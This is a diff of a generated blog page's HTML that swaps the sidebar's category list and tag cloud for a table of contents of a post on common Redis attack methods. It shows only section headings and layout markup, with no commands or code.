-            <a href="https://github.com/yui77111/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
-
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
   <header>
     
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/python/" href="/categories/python/"
-            id="categoriespython"
-            ><div class='name'>python</div><div class='badge'>(6)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/python/fun/" href="/categories/python/fun/"
-            id="categoriespythonfun"
-            ><div class='name'>fun</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/python/push/" href="/categories/python/push/"
-            id="categoriespythonpush"
-            ><div class='name'>push</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/python/tool/" href="/categories/python/tool/"
-            id="categoriespythontool"
-            ><div class='name'>tool</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/python/%E4%BE%BF%E6%8D%B7/" href="/categories/python/%E4%BE%BF%E6%8D%B7/"
-            id="categoriespythonE4BEBFE68DB7"
-            ><div class='name'>便捷</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"
-            id="categoriesE6B897E9808FE6B58BE8AF95"
-            ><div class='name'>渗透测试</div><div class='badge'>(4)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%9F%E6%B8%97%E9%80%8F/" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%9F%E6%B8%97%E9%80%8F/"
-            id="categoriesE6B897E9808FE6B58BE8AF95E59F9FE6B897E9808F"
-            ><div class='name'>域渗透</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%95%B0%E6%8D%AE%E5%BA%93/" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%95%B0%E6%8D%AE%E5%BA%93/"
-            id="categoriesE6B897E9808FE6B58BE8AF95E695B0E68DAEE5BA93"
-            ><div class='name'>数据库</div><div class='badge'>(2)</div></a></li>
-        
-      </ul>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#webshell"><span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5"><span class="toc-text">写入ssh公钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-text">定时任务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce"><span class="toc-text">主从复制rce</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lua-rce"><span class="toc-text">lua rce</span></a></li></ol></li></ol></li></ol>
     </div>
   </section>
 
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/cve/" style="font-size: 14px; color: #999">cve</a> <a href="/tags/python/" style="font-size: 24px; color: #555">python</a> <a href="/tags/redis/" style="font-size: 14px; color: #999">redis</a> <a href="/tags/sql-server/" style="font-size: 14px; color: #999">sql server</a> <a href="/tags/wechat-push/" style="font-size: 14px; color: #999">wechat push</a> <a href="/tags/%E5%9F%9F/" style="font-size: 19px; color: #777">域</a>
-    </div>
-  </section>
-
-
-  
 
   
 
@@ -522,8 +580,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="redis常见的几种攻击方式";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
